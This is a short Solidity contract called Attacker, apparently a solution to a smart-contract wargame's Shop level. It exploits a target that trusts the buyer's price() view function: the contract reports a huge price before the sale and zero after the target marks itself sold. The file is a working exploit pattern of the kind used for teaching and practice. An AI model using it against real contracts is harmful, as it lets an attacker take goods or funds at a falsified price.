// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}
contract Attacker {
    IShop target;

    constructor(address targetAddr) {
        target = IShop(targetAddr);
    }


    function price() public view returns(uint256) {
        if (target.isSold())
            return 0;
        else
            return type(uint256).max;
    }
    function attack() public {
        target.buy();
    }
}
